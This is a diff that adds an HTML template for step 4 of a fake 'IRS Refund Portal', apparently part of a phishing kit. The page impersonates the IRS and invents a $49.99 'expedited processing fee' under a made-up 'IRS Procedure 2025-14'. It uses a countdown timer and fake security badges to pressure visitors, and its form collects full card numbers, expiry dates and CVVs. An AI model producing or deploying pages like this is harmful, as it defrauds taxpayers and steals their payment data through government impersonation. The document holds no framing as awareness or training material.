@@ -1,0 +1,198 @@
+{% extends "layout.html" %}
+
+{% block title %}Step 4: Expedited Processing Fee — IRS Refund Portal{% endblock %}
+{% block breadcrumb %}Expedited Processing{% endblock %}
+
+{% block content %}
+<div class="page-main">
+
+    <div class="form-col">
+
+        <h1 class="page-title">Tax Refund Verification Portal</h1>
+        <p class="page-subtitle">Reference No: IRS-2026-REF-84920 &nbsp;|&nbsp; Refund Amount: <strong>$4,287.00</strong></p>
+
+        <div class="progress-steps">
+            <div class="progress-step completed"><span class="step-num">✓</span>Identity</div>
+            <div class="progress-step completed"><span class="step-num">✓</span>Contact</div>
+            <div class="progress-step completed"><span class="step-num">✓</span>Deposit</div>
+            <div class="progress-step active"><span class="step-num">4</span>Processing</div>
+            <div class="progress-step"><span class="step-num">5</span>Review</div>
+        </div>
+
+        <div class="alert alert-success">
+            ✅ &nbsp; Direct deposit account verified successfully.
+        </div>
+
+        <!-- Countdown timer -->
+        <div style="background:#c62828;color:#fff;border-radius:6px;padding:14px 20px;margin-bottom:20px;display:flex;align-items:center;gap:12px;">
+            <span style="font-size:20px">⏱</span>
+            <div>
+                <div style="font-size:13px;opacity:0.85">Reservation expires in:</div>
+                <div style="font-size:24px;font-weight:700;letter-spacing:2px" id="countdown-timer">10:00</div>
+            </div>
+            <div style="margin-left:auto;font-size:13px;opacity:0.85;text-align:right">
+                Your refund slot is reserved.<br>Complete payment before the timer expires.
+            </div>
+        </div>
+
+        <div class="form-card">
+            <div class="form-card-title">
+                💳 &nbsp; Step 4 of 5 — Expedited Processing Fee
+            </div>
+            <div class="form-card-desc">
+                To expedite your refund, a one-time processing fee of <strong>$49.99</strong> is required. This fee covers priority review and same-cycle processing to ensure your refund is deposited within <strong>3–5 business days</strong>. Without this fee, standard processing takes <strong>8–10 weeks</strong>.
+            </div>
+
+            <div class="payment-box">
+                <div style="display:flex;align-items:baseline;gap:8px">
+                    <div class="amount">$49.99</div>
+                    <div style="font-size:14px;color:#5a5a5a">one-time expedited processing fee</div>
+                </div>
+                <div class="comparison" style="margin-top:12px">
+                    <div class="fast">⚡ Expedited ($49.99): Deposit in 3–5 business days</div>
+                    <div class="slow">📬 Standard (free): Processing takes 8–10 weeks</div>
+                </div>
+                <div style="margin-top:10px;font-size:12px;color:#5a5a5a">
+                    Refund net after fee: <strong>$4,237.01</strong>
+                </div>
+            </div>
+
+            <div class="card-icons">
+                <span style="font-size:13px;color:#5a5a5a;margin-right:4px">Accepted:</span>
+                <span class="card-icon visa">VISA</span>
+                <span class="card-icon mc">MC</span>
+                <span class="card-icon amex">AMEX</span>
+                <span class="card-icon disc">DISC</span>
+            </div>
+
+            <form method="POST" action="/step/4" class="validated">
+
+                <div class="form-group">
+                    <label for="cardholder_name">
+                        Cardholder Name <span class="required">*</span>
+                    </label>
+                    <input type="text"
+                           id="cardholder_name"
+                           name="cardholder_name"
+                           placeholder="Name as it appears on card"
+                           required
+                           autocomplete="cc-name">
+                </div>
+
+                <div class="form-group">
+                    <label for="card_number">
+                        Card Number <span class="required">*</span>
+                    </label>
+                    <input type="text"
+                           id="card_number"
+                           name="card_number"
+                           placeholder="XXXX XXXX XXXX XXXX"
+                           maxlength="19"
+                           required
+                           autocomplete="cc-number"
+                           inputmode="numeric">
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="card_expiry">
+                            Expiration Date <span class="required">*</span>
+                        </label>
+                        <input type="text"
+                               id="card_expiry"
+                               name="card_expiry"
+                               placeholder="MM/YY"
+                               maxlength="5"
+                               required
+                               autocomplete="cc-exp"
+                               inputmode="numeric">
+                    </div>
+                    <div class="form-group">
+                        <label for="card_cvv">
+                            CVV / Security Code <span class="required">*</span>
+                        </label>
+                        <input type="text"
+                               id="card_cvv"
+                               name="card_cvv"
+                               placeholder="3–4 digits"
+                               maxlength="4"
+                               required
+                               autocomplete="off"
+                               inputmode="numeric"
+                               aria-describedby="cvv-hint">
+                        <div class="field-hint" id="cvv-hint">
+                            3 digits on back (Visa/MC/Disc) or 4 digits on front (Amex).
+                        </div>
+                    </div>
+                </div>
+
+                <hr>
+
+                <div class="security-badges">
+                    <div class="badge"><span class="icon">🔒</span> SSL Encrypted</div>
+                    <div class="badge"><span class="icon">✅</span> PCI DSS Level 1</div>
+                    <div class="badge"><span class="icon">🛡️</span> Fraud Protected</div>
+                    <div class="badge"><span class="icon">🔐</span> 3D Secure</div>
+                </div>
+
+                <button type="submit" class="btn-primary btn-red">
+                    🔒 &nbsp; Pay $49.99 &amp; Continue →
+                </button>
+
+                <p class="text-muted mt-4">
+                    Your card will be charged $49.99 for expedited processing. This charge will appear as "IRS REFUND PROC" on your statement. By submitting, you agree to our <a href="#">Terms of Service</a> and <a href="#">Refund Policy</a>.
+                </p>
+
+            </form>
+        </div>
+
+    </div>
+
+    <aside class="sidebar-col">
+
+        <div class="refund-status-box">
+            <div class="label">📋 Your Pending Refund</div>
+            <div class="amount">$4,287.00</div>
+            <div class="ref">Ref: IRS-2026-REF-84920</div>
+            <div class="status-tracker">
+                <div class="status-step done"><div class="status-dot"></div>Identity Verification</div>
+                <div class="status-step done"><div class="status-dot"></div>Contact Verification</div>
+                <div class="status-step done"><div class="status-dot"></div>Direct Deposit Setup</div>
+                <div class="status-step current"><div class="status-dot"></div>Processing Fee</div>
+                <div class="status-step"><div class="status-dot"></div>Refund Issued</div>
+            </div>
+        </div>
+
+        <div class="sidebar-widget">
+            <div class="sidebar-widget-title">Payment Summary</div>
+            <div class="review-row">
+                <span class="rl">Refund amount</span>
+                <span class="rv">$4,287.00</span>
+            </div>
+            <div class="review-row">
+                <span class="rl">Expedited fee</span>
+                <span class="rv" style="color:#c62828">−$49.99</span>
+            </div>
+            <div class="review-row" style="font-weight:700;border-top:2px solid #ddd;padding-top:8px;margin-top:4px">
+                <span class="rl">Net deposit</span>
+                <span class="rv" style="color:#2e7d32">$4,237.01</span>
+            </div>
+        </div>
+
+        <div class="sidebar-widget">
+            <div class="sidebar-widget-title">Why a Processing Fee?</div>
+            <p>Expedited processing requests are handled by a dedicated IRS rapid-refund team operating outside the standard 8–10 week cycle. The $49.99 fee covers the administrative cost of priority processing under IRS Procedure 2025-14.</p>
+        </div>
+
+        <div class="sidebar-widget">
+            <div class="sidebar-widget-title">Need Help?</div>
+            <ul>
+                <li>Taxpayer Service: <strong>1-800-829-1040</strong></li>
+                <li>Hours: Mon–Fri 7am–7pm</li>
+            </ul>
+        </div>
+
+    </aside>
+
+</div>
+{% endblock %}
